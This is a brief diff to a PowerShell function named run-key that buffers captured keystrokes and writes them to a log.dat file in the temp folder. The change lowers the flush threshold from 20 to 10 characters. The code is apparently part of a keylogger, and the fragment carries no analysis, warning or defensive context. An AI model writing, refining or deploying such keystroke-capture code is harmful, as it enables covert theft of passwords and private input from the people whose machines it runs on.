@@ -36,7 +36,7 @@ function run-key()
             # add key to logger file
             $lista += $mychar
             $counter++
-            if ($counter -ge 20)
+            if ($counter -ge 10)
             {
               $counter = 0
               cmd.exe /c "echo $lista>>%temp%\log.dat"
